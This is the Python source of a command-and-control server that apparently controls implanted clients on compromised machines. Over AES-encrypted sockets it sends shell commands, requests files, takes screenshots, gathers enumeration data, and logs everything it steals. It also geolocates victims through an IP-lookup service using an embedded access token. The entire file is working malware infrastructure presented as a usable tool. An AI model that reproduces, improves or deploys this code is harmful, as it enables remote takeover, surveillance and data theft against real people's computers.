import socket
import threading
import os
import zlib
import json
import datetime
import requests
from pyfiglet import Figlet
from Crypto.Cipher import AES

ip = "0.0.0.0"
port = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip,port))
server.listen(5)
command_queue = []
clients = dict()
active_clients = dict()
selected_client = None


def decrypt(data):
    key = b'Sixteen byte key'
    iv = b'Xallowtofghjklmn'
    decomp_data = zlib.decompress(data)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(decomp_data)


def encrypt(data):
    key = b'Sixteen byte key'
    iv = b'Xallowtofghjklmn'
    if len(data) % 16 != 0:
        data += b' ' * (16 - len(data) % 16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data)


print(f"[*] Listen on {ip}:{port}\n [*] Write help for help\n")

def handle_client(selected_client, command):
    try:
        client = active_clients[selected_client]
    except:
        print("\n[!] No client selected")
        return
    if len(command) % 16 != 0:
        command += ' ' * (16 - len(command) % 16)
    client_socket = client[0]
    beacon = client_socket.recv(1024)
    if beacon.decode() != "beacon":
        print(f"\n[!] No beacon received from {client[1]}")
        active_clients.pop(selected_client)
        return
    print(f"\n[*] Received beacon from {client[1]}")
    with open("./logs.txt", "a") as logs:
            logs.write(f"\n{datetime.datetime.now()} [*] Received beacon from {client[1]}")
            logs.write(f"\n{datetime.datetime.now()} [*] Sending '{command}' command to {client[1]}")
    enc_command = encrypt(command.encode())
    if command.split()[0] == 'f': # f <path>
        print(f"\n[*] Sending '{command}' command to {client[1]}")
        try:
            command = command.split()[1]
        except:
            print("\n[!] Invalid syntax for this command: f <path>")
        try:
            client_socket.send(enc_command)
            enc_file = client_socket.recv(1024)
            file = decrypt(enc_file)
            with open(f"./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [*] Received file from {client[1]}")
            with open(f"./{client[1][0]}_recv", "wb") as received_file:
                received_file.write(file)
        except:
            print(f'\n[!] This client is offline')
            with open("./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [!] This client is offline")
            active_clients.pop(selected_client)
            selected_client = None
    elif command.split()[0] == 'c': # c <command>
        print(f"\n[*] Sending '{command}' command to {client[1]}")
        try:
            client_socket.send(enc_command)
            output = decrypt(client_socket.recv(12345678)).decode()
            with open("./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [*] Received output from {client[1]}: {output}")
            print(output)
        except:
            print(f'\n[!] This client is offline')
            with open("./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [!] This client is offline")
            active_clients.pop(selected_client)
            selected_client = None
    elif command.split()[0] == 'ss': # ss
        print(f"\n[*] Sending '{command}' command to {client[1]}")
        try:
            client_socket.send(enc_command)
            screenshot = client_socket.recv(12345678)
            if screenshot.decode() == 'NO_DISPLAY':
                with open("./logs.txt", "a") as logs:
                    logs.write(f"\n{datetime.datetime.now()} [!] No display found on {client[1]}")
                print(f"\n[!] No display found")
                return
            with open("./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [*] Received screenshot from {client[1]}")
            with open(f"./{client[1][0]}_screenshot.png", "wb") as screenshot_file:
                screenshot_file.write(screenshot)
        except:
            print(f'\n[!] This client is offline')
            with open("./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [!] This client is offline")
            active_clients.pop(selected_client)
            selected_client = None
    elif command.split()[0] == "e": # e
        print(f"\n[*] Sending '{command}' command to {client[1]}")
        try:
            client_socket.send(enc_command)
            output = decrypt(client_socket.recv(12345678)).decode()
            with open("./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [*] Received output from {client[1]}: {output}")
            with open("./enumeration.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [*] Enumeration data from: {client[1]}: {output}")
            print(output)
        except:
            print(f'\n[!] This client is offline')
            with open("./logs.txt", "a") as logs:
                logs.write(f"\n{datetime.datetime.now()} [!] This client is offline")
            active_clients.pop(selected_client)
            selected_client = None
    else:
        print(f"\n[!] No commands to send")
        client_socket.send(enc_command)
        return


def command_input():
    while True:
        command_to_send = input("Enter a command to send (or 'exit' to quit): ")
        if not command_to_send:
            continue
        if command_to_send.lower() == 'exit':
            with open("clients.json", "w") as file:
                file.write(json.dumps(clients))
            os._exit(1)
        elif command_to_send.lower() == 'active':
            print("\n[*] All clients: ")
            for name, client in clients.items():
                print(f'\n{name} - ({client[0]}:{client[1]})')
            print("\n[*] Active clients: ")
            for name, client in active_clients.items():
                print(f'\n{name} - ({client[1][0]}:{client[1][1]})')
        elif command_to_send.split()[0] == 'select': # select client-name
            try:
                client = command_to_send.split()[1]
            except:
                print("\n[!] Invalid syntax for this command: select client-name")
                continue
            if client in active_clients.keys():
                print(f"\n[*] Selected {client}")
                selected_client = client
            else:
                print(f"\n[!] {client} not in active clients")
        elif command_to_send.split()[0] == 'rename': # rename <old_client_name> <new_client_name>
            try:
                old_name = command_to_send.split()[1]
                new_name = command_to_send.split()[2]
            except:
                print("\n[!] Invalid syntax syntax for this command: rename <old_client_name> <new_client_name>")
                continue
            if old_name in clients.keys():
                clients[new_name] = clients.pop(old_name)
                active_clients[new_name] = active_clients.pop(old_name)
                print(f"\n[*] Renamed {old_name} to {new_name}")
            else:
                print(f"\n[!] {old_name} not in clients")
        elif command_to_send.split()[0] == 'remove': # remove client-name
            try:
                client = command_to_send.split()[1]
            except:
                print("\n[!] Invalid syntax for this command: remove client-name")
                continue
            if client in clients.keys():
                clients.pop(client)
                active_clients.pop(client)
                print(f"\n[*] Removed {client}")
            else:
                print(f"\n[!] {client} not in clients")
        elif command_to_send.split()[0] == 'location': # location client-name
            try:
                client = command_to_send.split()[1]
            except:
                print("\n[!] Invalid syntax for this command: location client-name")
                continue
            if client not in clients.keys():
                print(f"\n[!] {client} not in clients")
                continue
            access_token = 'dcd158d6744f01'
            url = f"https://ipinfo.io/{clients[client][0]}/json?token={access_token}"
            response = requests.get(url)
            data = response.json()
            print(f"\n[*] Location of {client}:")
            try:
                print(f"\nIP: {data['ip']}")
                print(f"\nCity: {data['city']}")
                print(f"\nRegion: {data['region']}")
                print(f"\nCountry: {data['country']}")
                print(f"\nLocation: {data['loc']}")
                print(f"\nOrganisation: {data['org']}")
            except:
                print("\n[!] Failed to get location")
        elif command_to_send.split()[0] == "help": # help
            f = Figlet(font='slant')
            print(f.renderText('C2 - Command & Control server'))
            print("""[*] Use 'active' commands to list active clients
[*] Use 'rename <old_client_name> <new_client_name>' command to rename client
[*] Use 'select <client_name>' command to select client
[*] Use 'e' command to get information about client 
[*] Use 'f <path>' command to get file from client          
[*] Use 'ss' command to get screenshot from client
                  """)
        else:
            try:
                client_handler = threading.Thread(target=handle_client,args=(selected_client, command_to_send))
                client_handler.daemon = True
                client_handler.start()
            except:
                print("\n[!] No client selected")


input_thread = threading.Thread(target=command_input, args=())
input_thread.daemon = True
input_thread.start()
try:
    with open("clients.json", "r") as file:
        clients = json.loads(file.read())
except:
    print("\n[!] No clients found in clients.json file")
while True:
    client, addr = server.accept()
    print(f"\n[*]Accepted connection from {addr[0]}:{addr[1]}")
    length = len(clients)
    exsisting_client = False
    for name, address in clients.items():
        if addr[0] == address[0] and addr[1] == address[1]:
            print(f'{addr[0]}:{addr[1]} , {address[0]}:{address[1]}')
            exsisting_client = True
            active_clients[name] = (client, addr)
            break
    if not exsisting_client:
        clients[f"client-{length + 1}"] = addr
        print(f'{clients}')
        active_clients[f"client-{length + 1}"] = (client, addr)

